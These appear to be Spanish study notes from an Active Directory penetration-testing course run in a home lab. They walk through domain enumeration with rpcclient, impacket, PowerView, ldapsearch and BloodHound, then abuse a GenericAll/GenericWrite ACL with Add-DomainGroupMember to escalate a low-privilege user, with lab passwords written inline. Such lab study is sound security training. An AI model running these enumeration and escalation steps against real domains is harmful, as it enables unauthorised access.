Para mas informacion archivo rpcclient que he dejado en la carpeta
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego que estemos dentro podemos precionar dos veces tab para ver sus funcionoes
unas de ellas

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"enumdomusers"
para enlistar los usuarios, pero se requiere de privilegios
al igual si ejecutamos para ver los grupos
"enumalsgroups builtin"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En cambio si nos logeamos con la cuenta de administrador

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"enumdomusers"
user:[Administrador] rid:[0x1f4]
user:[DefaultAccount] rid:[0x1f7]
user:[Invitado] rid:[0x1f5]
user:[Kali] rid:[0x3e8]
user:[WDAGUtilityAccount] rid:[0x1f8]
Tendremos acceso absoluto
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"enumalsgroups builtin"
group:[Administradores] rid:[0x220]
group:[Administradores de Hyper-V] rid:[0x242]
group:[Duplicadores] rid:[0x228]
group:[IIS_IUSRS] rid:[0x238]
group:[Invitados] rid:[0x222]
group:[Lectores del registro de eventos] rid:[0x23d]
group:[Operadores criptográficos] rid:[0x239]
group:[Operadores de asistencia de control de acceso] rid:[0x243]
group:[Operadores de configuración de red] rid:[0x22c]
group:[Operadores de copia de seguridad] rid:[0x227]
group:[Propietarios del dispositivo] rid:[0x247]
group:[System Managed Accounts Group] rid:[0x245]
group:[Usuarios] rid:[0x221]
group:[Usuarios avanzados] rid:[0x223]
group:[Usuarios COM distribuidos] rid:[0x232]
group:[Usuarios de administración remota] rid:[0x244]
group:[Usuarios de escritorio remoto] rid:[0x22b]
group:[Usuarios del monitor de sistema] rid:[0x22e]
group:[Usuarios del registro de rendimiento] rid:[0x22f]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para saber a que grupo pertenece x usuario seria:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
queryaliasmem builtin y le agregamos en este caso 0x220
que pertenece en el cuadro anterior al grupo de administrador
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Presenta esto

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
queryaliasmem builtin 0x220
        sid:[S-1-5-21-1543281945-545891901-768622172-500]
        sid:[S-1-5-21-1543281945-545891901-768622172-1000]
        sid:[S-1-5-21-1087878042-4283918813-3206888575-512]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

El sid son identificadores de la los grupos al que pertenece el administrador
y lo podemos ver con la siguiente funcion

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lookupsids mas S-1-5-21-1543281945-545891901-768622172-500

rpcclient $> lookupsids S-1-5-21-1543281945-545891901-768622172-500
S-1-5-21-1543281945-545891901-768622172-500 WS01\Administrador (1)

rpcclient $> lookupsids S-1-5-21-1543281945-545891901-768622172-1000
S-1-5-21-1543281945-545891901-768622172-1000 WS01\Kali (1)

rpcclient $> lookupsids S-1-5-21-1087878042-4283918813-3206888575-512
S-1-5-21-1087878042-4283918813-3206888575-512 CORP\Admins. del dominio (2)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra herramienta a utilizar es impacket, una herramienta que utiliza las clases de python las cuales podemos elaborar o usar para interpretar con maquinas windows


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-samrdump corp/empleado1:@ng01*Apolo@WS01.corp.local
Obviamente no sera captado porque ese usuario no tiene privilegios
Si lo cambiamos a Administrador nos mostrara toda la informacion del
usuario y sus detalles.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra forma de tener informacion pero solo funciona con privilegios

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-netview corp.local/empleado1:'@ng01*Apolo' -target WS01.corp.local
esto se quedara escuchando sessiones de red que se establezcan a este usaurio
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En caso de tener el usuario empleado1 o simplemente el de administrador que sabemos
que en una aditoria seria casi imposible que no los entreguen, en este ejemplo con el 
usuario de administrador, recibiriamos el ip del host que realizo la comunicacion con
nosotros, en este caso ingrese en la maquina server \\WS01\C$ en el buscador de 
archivos y esto obviamente el comando del cuadro anterior lo detecto mostrando la 
informacion ya mencionada.

Lo siguiente que haremos es pasar una .dll que es una libreria que te permite ejecutar varias funciones como lo es ‘Get-ADDomain’
Se ubica en la maquina server en c/windows/microsoft.net/assembli/gac_64/microsoftActiveDirectory.management y asi mismo se llama el archivo .dll

La pasaremos a nuestra maquina WS01, para probar las funciones de estas librerias. lo podemos hacer como ya sabemos, por medio de las carpetas compartidas como la que creamos, nos dirigomos al explorador y 
\\DC01\departamental y listo.

importamos la libreria, nos movemosa donde pasamos el archivo .dll
en mi caso en el Desktop, luego de estar ahi

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Import-Module .\Microsoft.ActiveDirectory.Management.dll 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego de importarlo ingresamos el comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-ADDomain
Nos muestra informacion de la maquina de dominio principal
Version del windows, nombre de equipo , nombre de dominio entre otras cosas
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En powerview el mismo comando seria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetDomain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


en powerview, para ver las politicas del campo systemaccess

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(Get-DomainPolicy).'SystemAccess' 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Con libreria .dll

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Get-ADDomainController 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

No estrega la informacion del controlador de dominio de nuestra infraestructura


Es lo mismo que lo anterior pero en powerview

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetDomainController 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Con el archivo .dll

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-ADUser -Filter *  
podemos ver todos los usuarios de la infraestructura
Get-ADUser -Filter * | select Name,ObjectClass,ObjectGuid 
recordadr que le podemos colocar un select para seleccionar los campos que queremos visualizar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Para powerview lo mismo que lo anterior

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser | select Name,ObjectClass,ObjectGuid
nos muestra los usuarios y mas informacion de la infraestructura
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Con el archivo .dll

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Get-ADComputer -Filter *
 Podemos ver todos los equipos de la infraestructura
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Powerview

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetComputer
Get-NetComputer | select name,operatingsystem,samaccountname
para ver lo que queria, los nombres de los equipos, sistema operativo y nombre de usuario en la infraestructura
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pero no nos confirma que esos equipos esten activos, o que esten levantados
en el nodo, como lo puede hacer powerview? de la siguiente forma.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetComputer -Ping | select name,operatingsystem
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Tener en cuenta que vamos a continuar con comandos de powerview pero de igual forma se pueden buscar comandos en la libreria .dll anterior
Esta vez usare la maquina WS01 en donde el antivirus no detecta la herramienta powerview

El primer comando para ver mas informacion de la infraestructura acerca de los grupos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainGroup
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para ver todos los grupos 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainGroup | select grouptype,name,description
Tipo de grupo, nombre y descripcion en este caso
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para saber a que grupo pertenece cada usuario en este caso lo fijare a los que son administradores

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetGroupMember -Identity "Administradores"
para mas especifico y solo quedarnos con los nombres
Get-NetGroupMember -Identity "Administradores" | select MemberNAme
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para ver los recursos compartidos entre si

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Find-DomainShare
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Unidades organisativas, nos mostrara todos los dominios controladores

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetOU
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para ver las politicas de la infraestructura

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetGPO
Get-NetGPO | select Displayname  
Para ver exactamente las politicas creadas y default
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para saber hacia donde van dirigidas las GPO las politicas

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetGPO -ComputerIdentity WS02
Obviamente se le aplica el select anterior para ver solo los nombres
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para ver todas las Acl acces control list

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-ObjectAcl
para un objetivo en especifico ingresamos 
Get-ObjectAcl -SamAccountName empleado2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Un pequeno resumen de que son las ACL

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Las Listas de Control de Acceso (ACL, por sus siglas en inglés Access Control List) 
son herramientas utilizadas en redes informáticas y sistemas operativos para controlar 
el acceso a recursos o servicios. Una ACL es una lista de permisos o reglas que especifica 
qué usuarios o sistemas tienen permiso para acceder a qué recursos y qué tipo de acciones pueden realizar sobre esos recursos.

Por lo general, las ACL se utilizan para controlar el acceso a archivos, directorios, dispositivos 
de red, puertos de red y otros recursos en una red o sistema informático. Pueden definirse a nivel 
de sistema operativo, firewall, enrutador o cualquier otro dispositivo de red que necesite gestionar el acceso.

Las ACL pueden ser configuradas de manera flexible para permitir o denegar el acceso basándose en diferentes criterios como 
direcciones IP, rangos de direcciones IP, usuarios, grupos de usuarios, protocolos de red, puertos, entre otros. 
Esto permite a los administradores de red o sistemas establecer políticas de seguridad personalizadas y controlar 
quién puede acceder a qué recursos y cómo pueden interactuar con ellos.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Informaicon de los forest en este caso solo poseemos 1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetForestDomain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Una funcion que se dedica a lanzar peticiones


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Find-LocalAdminAccess -Verbose
Intenta buscar para que maquina  o acceso la maquina donde se ejecuta
posee acceso administrativos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra funcion, enumerar usuarios en administradores locales en varios equipos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-EnumerateLocalAdmin -Verbose
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Cuando me refiero a peticiones es que estas funciones lanzan mas funciones en conjuntos
y lanzan mas informacion en conjunto, por ejemplo Varios Get,Find,New todo en un solo comando

Busca secciones

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-UserHunter -GroupName "RPDUsers"
Por el momento no tenemos targets referentes a UserHunter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora pasaremos a usar kali para buscar toda la informacion que hemos encontrado hasta
ahora con la herramienta ldapsearch
ldapsearch es una herramienta de línea de comandos utilizada para interactuar con servidores LDAP (Protocolo Ligero de Acceso a Directorios)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -h
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -x -h 192.168.0.7 -D '' -w '' -b "DC=corp,DC=local"
Esto funciona si el dominio esta mal configurado y permite la entrada
sin credenciales como casos atras con el usuario anonymous
-x modo de auntenticacion en este caso modo basico
-h el host con el que queremos hacer autenticacion, en este caso el dominio de controlador
-D indicaoms el nombre usuario
-w indicamos la clave de usuario
Estos los dejamos vacios para verificar si podemos entrar de forma anonima
-b indicamos con que parte del dominio queremos interactuar, le decimos
interactua con corp.local
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En kali, con la herramienta LDAP

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -x -h 192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "DC=corp,DC=local" este no me funciono sin embargo este si
ldapsearch -x -H ldap://192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "DC=corp,DC=local"
Con este comando nos volcaran todas las informaciones que hemos visto anteriormente.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -x -H ldap://192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "CN=Users,DC=corp,DC=local"
Como ya sabemos anteriormente -b le decimos que busque dentro de DC corp.local que viene siendo
en el active directory usuarios y equipos y dentro de corp.local le decimos tambien hey busca CN=Users, muestrame
todos los usuarios, tener en cuenta que dentro de una organizacion en vez de CN seria OU, OU=Users.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Como hemos visto vendria siendo detras hacia delante, ahora, si quisiera solo ver un usuario en especifico como por ejemplo empleado2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -x -H ldap://192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "CN=empleado2,CN=Users,DC=corp,DC=local"
En este caso para llamar al empleado tanto como una empresa como en esta prueba es CN. CN=Usuario1 por ejemplo.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


De igual forma para saber los equipos y enumerarlos y de igual forma especificar cual ver

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -x -H ldap://192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "CN=WS02,CN=Computers,DC=corp,DC=local"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para ver los grupos y en este caso buscar los que son administradores

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ldapsearch -x -H ldap://192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "CN=Administradores,CN=Builtin,DC=corp,DC=local"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra herramienta de kali es la llamada pywerview

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pywerview get-netdomaincontroller -u empleado2 --dc-ip 192.168.0.7 -p Ap09mncd
Informacion del controlador del dominio.
Para los usuarios
pywerview get-netuser -u empleado2 --dc-ip 192.168.0.7 -p Ap09mncd
y asi para mas informacion tengo el archivo y los comandos 
netgpo para las politicoas netgroup para los grupos etc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Otra herramienta y quizas la mas facil de utilizar ya que esta es totalmente grafica,
podremos interactuar de forma mas sencilla y se llama jxplorer

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Primero presionamos a conectar a la izquierda en la parte superior
segundo colocar la ip del host del active directory
tercero elegir la opcion de usuario y password
aqui nos pedira el DN y la clave
Para buscar el dn como anteriormente lo hicimos utilizando ldapsearch
ldapsearch -x -H ldap://192.168.0.7 -D "CORP\empleado2" -w "Ap09mncd" -b "CN=empleado2,CN=Users,DC=corp,DC=local" 
Con esto nos mostrara la informacion del usuario que elegimos en este caso empleado2
Buscamos dn y la pegamos al igual que la clave
El DN lo que hace es buscar al usuario dentro de la jerarquia del dominio en este caso es.
dn: CN=empleado2,CN=Users,DC=corp,DC=local
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Precionamos corp dos veces y nos mostrara toda la infraestructura como lo hace domain controller en windows servers

Y que podriamos hacer, con privilegios practicamente estariamos dentro de la infraestructura como administrador y realizar cambios a nuestro antojo

Ahora pasaremos a la herramienta mas importante en este ambito que hemos visto de dominios y domain controller

BlooHound

Se basa en una base de datos no relacional, que esta base de datos de basa en neo4j


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Empezamos ingresando sudo neo4j console
esto nos proporcionara una ip hot y un link para la base de datos neo4j
En usuario y contrasena la primera vez seran neo4j ambas y luego podremos cambiar  la contrasena

Ya con esto podemos cerrar e ingresar en la terminal bloodhound, esto nos
abrira la aplicacion bloodhound
Nos crearemos un script para pasarlo a la maquina WS02, en el repositorio de github
de bloodhoundAD/Bloodhound en collector y luego en SharpHound.ps1, copiamos y pegamos.
podemos precionar raw para una mejor vista y seguridad de que se copie solo lo que queremos
En mi caso lo llamare shar.ps1, recordad que tipo de archivos todo en guardar como

Tener en cuenta, tengo todo del antivirus activo y no se detecto, quizas
en un windows 11 con herramientas ids potentes u otras herramientas.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Despues de crear el script en la maquina WS02, empleado2, vamos a realizar una prueba
en domain controller cree un grupo con permisos de administrador llamado Executive y un 
usuario llamado empleado4 quien pertenece al grupo Executive, por que esto, cuando
utilizamos powerview para percatarnos que ese usuario de una forma u otra esta colado por decirlo asi a ese grupo y que de alguna forma tiene permisos de administrador,
tendriamos que verificar carpetas y subcarpetas y mas subcarpetas algo que seria muy 
tedioso, sin imaginar en una empresa con digamos 10,000 empleados que serian la misma
cantidad de ususarios, como veriamos de una forma mas eficiente, pues aqui entra bllodhound


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
En la maquina WS02 luego de ejecutar el script creado . .\shar.ps1
luego ingresamos: Invoke-BloodHound -CollectionMethod All
Esto nos importara dos archivos y el .zip contendra toda la informacion
recopilada y es la cual trasnfiriremos a kali, podemos hacerlo
de diferentes formas como la vez pasada con el comando de escucha en kali
y el comando en la maquina WS02 con el archivo.
Ya pasado simplemente arrastramos el archivo .zip a la aplicacion bloodhound
Unas de las cosas mas importantes es la ventana analysis, ya que cuentas
con query, por ejemplo la primera me dice cual es domain admin y sus dependientes
es decir miembro de miembro de miembro etc.
De igual forma otro que nos muestra el camino mas corto para llegar al usuario
de administrador, otra cosa en la informacion que proporciona por ejemplo
si precionamos click derecho en las lineas que conecta en un permiso llamado
generic all y precionamos help, nos muestra informacion de como lo podemos
explotar tanto como en windows como en linux, nos da referencia en repositorios
y nos explica por ejemplo este tipo de permisos es absoluto tiene control total

Y podemos hacer eso con todos los permisos ver como explotarlos y ver como llegar al administrador
y mas importante como vimos al principio a la base de datos que seria el domain controller

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


De igual forma podemos estudiar mas querys en repositorios, que estan creados y ver las funciones de estos para realizar nuestro analisis 
mas eficientes.

Esos query como por ejemplo: MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"name": "Find all active Domain Admin sessions",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p"
                }Esta nos permite ver todas las sesiones activas de administrador de dominio
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Tambien podemos interactuar con los objetos, por ejemplo con el usuario empleado4 click derecho y marcar la opcion comprometer
esto creara basicamente un filto, ya que habran query que diran que por ejemplo, muestrame la ruta mas corta hacia administrador desde un comprometido
al marcar esto nos hara mas facil determinar si ese usuario puede serlo, ya que si lo atacan pueden llegar a tener permisos admin

De igual forma como marcamos la opcion comprometidos marcar donde dice las relaciones mas cortas, por ejemplo de empleado4 seria el grupo que le colocamos y demas.

Seccion 5

Nos dirigimos a usuarios y equipos en active directory, recordar siempre que la casilla ver carateristicas especiales deben de estar
activas, luego de eso seleccionamos un usuario y propiedades y nos dirigimos a seguridad, luego a opciones avanzadas y veremos
lo siguiente:

Esto es que vamos a trabajar y ver que son las ACL

DACL=permisis y SACL=auditoria


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(security descriptor)Un descriptor de seguridad contiene la información de seguridad asociada a 
un objeto protegible.Un descriptor de seguridad consta de una estructura de SECURITY_DESCRIPTOR 
y su información de seguridad asociada. Un descriptor de seguridad puede incluir la siguiente 
información de seguridad:

Identificadores de seguridad (SID) para el propietario y el grupo principal de un objeto.

Una DACL que especifica los derechos de acceso permitidos o denegados a usuarios o grupos concretos.

SACL que especifica los tipos de intentos de acceso que generan registros de auditoría para el objeto.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para mas informacion: Descriptores de seguridad: aplicaciones Win32 | Microsoft Learn


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(securable object) Un objeto protegible es un objeto que puede tener un descriptor de seguridad. 
Todos los objetos de Windows con nombre son protegibles. Algunos objetos sin nombre, como los 
objetos de proceso y de subproceso, también pueden tener descriptores de seguridad. Para la 
mayoría de los objetos protegibles, puede especificar el descriptor de seguridad de un objeto en 
la llamada de función que crea el objeto. Por ejemplo, puede especificar un descriptor de seguridad 
en las funciones CreateFile y CreateProcess.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Tener en cuenta como se menciono anteriormente en SID que es el propietario o (owner), cuando ingresamos a opciones avanzadas
luego de seguridad se nos presentara encima de DACL y la SACL, es muy importante porque por ejemplo el administrador es
quien tiene el control total de todo esto como owner.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
DACL y ACE

Si un objeto de Windows no tiene una lista de control de acceso discrecional (DACL), 
el sistema permite a todos los usuarios acceso completo a ella. Si un objeto tiene una DACL, 
el sistema solo permite el acceso que permiten explícitamente las entradas de control de 
acceso (ACE) en la DACL. Si no hay ACE en la DACL, el sistema no permite el acceso a nadie. 
Del mismo modo, si una DACL tiene ACE que permiten el acceso a un conjunto limitado de usuarios 
o grupos, el sistema deniega implícitamente el acceso a todos los fideicomisarios no incluidos 
en las ACE.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Lo siguiente es crear un script y este nos creara 100 usuarios, grupos, ACL y demas
lo dejare en 100 usuario pero mas recomendable seria miles ya que en las empresas macro es la realidad
mas dificil pero aprendizaje real por decirlo asi.
noss iremos al repositorio vulnerable ad github y copiamos la informaicon de vuln.ps1 y por error de codigo borramos
showbanner que esta al final mencionado y la funcion showbanner completa, luego ejecutamos el escript
luego de crear, ya saben tipo todo, le coloque el nombre Vuln.ps1, ejecuto . .\Vuln.ps1 y luego el siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-VulnAD -UsersLimit 100 -DomainName “corp.local”
ejecutara lo comentado anteriormente
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


El objetivo de esto y que comente anteriormente es pertenecer a un usuario normal sin privilegios y escalar a uno con privilegios
de administrador.

Tener en cuenta que desde cualquier punto nuestro objetivo sera siempre alcanzar al administrador principar que es 
Admin. del Dominio.

Ejecutamos el siguiente comando para ver sus ACL

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainObjectAcl -Identity "Admins. del dominio" 
nos mostrara diferentes cuadros con diferentes ACL y sus identificadores llamados objectsSID
como lo podemos vizualizar ya que este viene cifrado pues de la siguiente forma
Convert-SidToName S-1-5-21-1087878042-4283918813-3206888575-512, que sera: CORP\Admins. del dominio    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Aqui veo hacia donde se aplica esa ACL el tipo de permiso, nivel de permisos y demas informacion

De igual forma con securityindentifier 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Convert-SidToName S-1-5-21
en este caso es local system
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Importante quedarnos con la mas esencial y vayamaos a necesitar, sabemos como colocar el filtro y a continuacion los 
aspectos importantes para ver 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainObjectAcl -Identity "Admins. del dominio" | select SecurityIdentifier,AceType,ActiveDirectoryRights | fl 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para mostrar todas las identificaciones que deseo pero en vez de codigos que se muestren sus codigos, en conjunto con el comando
anterior

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainObjectACL -Identity "Admins. del dominio" | select @{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}},AceType,ActiveDirectoryRights | fl
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ya con esto podremos ver los nombres y sus tipos de acceso y el limite de este

El siguiente realiza un analisis de todas las DACL de todos los objetos de nuestro dominio y nos muestra aquellas que tienen un valor mayor a 1000 en en securityidentifier

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActveDirectoryRights | fl
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Cuando tienen un valor mayor a 1000 significan que fueron creados despues del dominio,

fl: Este es el alias de Format-List, que se utiliza para formatear la salida de los objetos seleccionados en forma de lista.

Ingresamos el siguiente comando para extraer la informacion del dominio y vizualizarla en kali con la herrameinta bloodound

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-BloodHound -CollectionMethod All  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Iniciamos en kali primero la base de datos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo neo4j console
y luego bloodhound
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Antes de comenzar bajamos al final y borramos Database para tener todo limpio y empezar
y en la maquina que tengamos acceso ingresamos el comando 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
primero ejecutamos > . .\shar.ps1                                                                             
luego podemos ingresar > Invoke-BloodHound -CollectionMethod All  
Para tener un .zip de la base de datos actualizado
recordar ctrl + r para mostrar los comando utilizados, ingresar como comienza y listo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Bien, vamos a empezar por buscar el camino para llegar a admin.dominio.corp
elegi un usuario sin privilegios dentro de un grupo sin privilegios diferente que el video

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
usuario-ADEY CELESTYNA password-Ap09mncd
grupo-Marketing
Grupo-Proyect
hasta llegar al dominio indicado
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1ero-Obviamente le cambiamos la clave al usuario para ingresar 
2-Me ire directamente al grupo proyect manangament a la parte explicit object controllers y atacare el 6to privilegio
llamado genericall que esta enlazado del grupo sales sin privilegios al grupo proyect con privilegios
3-Nos iremos a la maquina WS02 para usar el usuario Adey, para esto seleccionamos powershell con click derecho
colocamos el mouse encima de powershell, precionamos shift y click derecho y nos saldra la opcion de ejecutar con otro usuario.
e ingreso ADEY.CELESTYNA y su clave, esto me abrira otra terminal, debo de salir en este caso de empleado2 que es WS02 con cd ..
y entrar al usuario nuevo.
O de forma remota

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
runas /user:corp\ADEY.CELESTYNA powershell
luego me pedira su clave y listo de forma remota ingreso 
de igual forma como la anterior.
o para ingresar de forma local y seguir utilizando empleado2 y en linea el usuario Anna seria:
runas /user:corp\ADEY.CELESTYNA /netonly powershell > de esta forma podemos ejecutar powerview que es
lo que utilizaremos sin ningun problema ya que tendremos acceso a la informacion de ese usuario

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Luego de conectarnos de forma local y haber ejecutado powerview ejecutamos el siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainGroup | select name
Con esto podemos ver los nombres de los grupos de dominios
no interesa Project management
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

4to-Ingresamos el siguiente comando para ingresar nuestro usuario Adey a este 
grupo con el siguiente comando, estos comandos se encuentrar al precionar click derecho sobre el privilegio y en la ventana por este caso de windows abuse
se encuentran los comandos que podemos utilizar en windows para este privilegio

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
En nuestro caso
Add-DomainGroupMember -Identity "ADEY.CELESTYNA" -Members "Project management" -Credential $Cred  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


todo esto seria el ejemplo, ya que me costo encontrar un usuario sin privilegios que este en un grupo sin privilegios pero con permisos en un grupo con
privilegios, todo sera igual como anteriormente lo coloque solo que cambiar el nombre de usuario, ya que nos interesa ingresar a el grupo project management.

En mi caso encontre la usuaria-Dita.Gerrie del grupo accouting quien tiene permiso con project management

Luego de ingresar el comando anterior para anadir el usuario al grupo project con el permiso esta vez GenericWrite ingresamos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainGroupMember -Identity 'Domain Admins'
para confirmar si ese dominio tiene el ususario que acabamos de anadir en este caso a dita.gerrie
cambiamos domain admins por el grupo que nos interesa que es project management 
